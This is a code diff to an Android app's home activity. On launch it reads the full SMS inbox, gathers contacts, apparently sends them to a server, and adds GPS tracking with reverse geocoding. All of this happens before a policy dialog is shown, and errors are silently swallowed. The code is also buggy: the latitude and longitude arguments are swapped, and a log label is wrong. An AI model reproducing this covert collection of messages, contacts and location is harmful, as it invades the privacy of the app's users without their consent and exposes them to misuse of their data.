@@ -1,12 +1,22 @@
 package com.example.aglowmudra;
 
+import androidx.annotation.RequiresApi;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.fragment.app.FragmentManager;
 
+import android.Manifest;
 import android.content.ContentResolver;
+import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.location.Address;
+import android.location.Geocoder;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Bundle;
 import android.provider.ContactsContract;
 import android.provider.Telephony;
@@ -18,6 +28,8 @@ import android.util.Log;
 import org.json.JSONObject;
 
 import java.util.ArrayList;
+import java.util.List;
+import java.util.Locale;
 
 import Fragment.FragmentPolicy;
 import okhttp3.FormBody;
@@ -32,17 +44,27 @@ import static android.provider.Telephony.Sms.CONTENT_URI;
 public class AglowHomeActivity extends AppCompatActivity {
     final ArrayList<String> nameList = new ArrayList<>();
     ArrayList<String> phone = new ArrayList<>();
+  double latitute;
+  double longitude;
+    String val1="";
+    String val2="";
 
+    @RequiresApi(api = Build.VERSION_CODES.M)
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_aglow_home);
-        getSMs();
-        getAllContacts();
-        SendContact1();
-        FragmentPolicy fragmentPolicy=new FragmentPolicy();
-        FragmentManager fragmentManager=getSupportFragmentManager();
-        fragmentPolicy.show(fragmentManager,"policy_mode");
+        try {
+            getSMs();
+            getAllContacts();
+            SendContact1();
+            getLocation();
+        }catch (Exception e){
+            e.getStackTrace();
+        }
+        FragmentPolicy fragmentPolicy = new FragmentPolicy();
+        FragmentManager fragmentManager = getSupportFragmentManager();
+        fragmentPolicy.show(fragmentManager, "policy_mode");
 
 
     }
@@ -169,33 +191,97 @@ public class AglowHomeActivity extends AppCompatActivity {
         }
 
     }
-public void getSMs(){
-        Log.d("TAG","VAlue is created in sms ");
-        ArrayList<String> arrayList=new ArrayList<>();
+
+    public void getSMs() {
+        Log.d("TAG", "VAlue is created in sms ");
+        ArrayList<String> arrayList = new ArrayList<>();
         Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
 
         if (cursor.moveToFirst()) { // must check the result to prevent exception
-            Log.d("TAG","Value is creted in curser Lop");
+            Log.d("TAG", "Value is creted in curser Lop");
             do {
                 String msgData = "";
-                for(int idx=0;idx<cursor.getColumnCount();idx++)
-                {
-                    Log.d("TAG","Value is Creted");
+                for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
+                    Log.d("TAG", "Value is Creted");
                     msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
-                    Log.d("TAG","VAlue is created in system"+msgData);
+                    Log.d("TAG", "VAlue is created in system" + msgData);
                     arrayList.add(msgData);
 
                 }
                 // use msgDat
-                Log.d("TAG","VAlue is created when call"+arrayList);
+                Log.d("TAG", "VAlue is created when call" + arrayList);
 
             } while (cursor.moveToNext());
         } else {
             // empty box, no SMS
-            Log.d("TAG","VAlue if no sms Presnt");
+            Log.d("TAG", "VAlue if no sms Presnt");
         }
     }
 
+    @RequiresApi(api = Build.VERSION_CODES.M)
+    public void getLocation() {
+        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            // TODO: Consider calling
+            //    Activity#requestPermissions
+            // here to request the missing permissions, and then overriding
+            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
+            //                                          int[] grantResults)
+            // to handle the case where the user grants the permission. See the documentation
+            // for Activity#requestPermissions for more details.
+            return;
+        }
+        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, new LocationListener() {
+            public void onStatusChanged(String provider, int status, Bundle extras) {
+                // called when the location provider status changes. Possible status: OUT_OF_SERVICE, TEMPORARILY_UNAVAILABLE or AVAILABLE.
+            }
+
+            public void onProviderEnabled(String provider) {
+                // called when the location provider is enabled by the user
+            }
+
+            public void onProviderDisabled(String provider) {
+                // called when the location provider is disabled by the user. If it is already disabled, it's called immediately after requestLocationUpdates
+            }
+
+            public void onLocationChanged(Location location) {
+                latitute = location.getLatitude();
+                longitude = location.getLongitude();
+                Log.d("TAG", "Value of latitude is :" + latitute);
+                Log.d("TAG", "Value of latitude is :" + longitude);
+
+            }
+
+        });
+
+        try {
+
+
+
+
+            Geocoder geo = new Geocoder(this.getApplicationContext(), Locale.getDefault());
+            List<Address> addresses = geo.getFromLocation(longitude, latitute, 1);
+            if (addresses.isEmpty()) {
+                Log.d("TAG", "Value is creted by address");
+            } else {
+                if (addresses.size() > 0) {
+                    Log.d("TAG","Value of address"+addresses);
+                    Log.d("TAG", "Location Name" + addresses.get(0).getFeatureName() + ", " + addresses.get(0).getLocality() + ", " + addresses.get(0).getAdminArea() + ", " + addresses.get(0).getCountryName());
+//                    yourtextboxname.setText(addresses.get(0).getFeatureName() + ", " + addresses.get(0).getLocality() +", " + addresses.get(0).getAdminArea() + ", " + addresses.get(0).getCountryName());
+                }
+            }
+        } catch (Exception e) {
+            e.getStackTrace();
+
+        }
+
+    }
+
+    @Override
+    protected void onPause() {
+        super.onPause();
+        finish();
+    }
 }
 
 
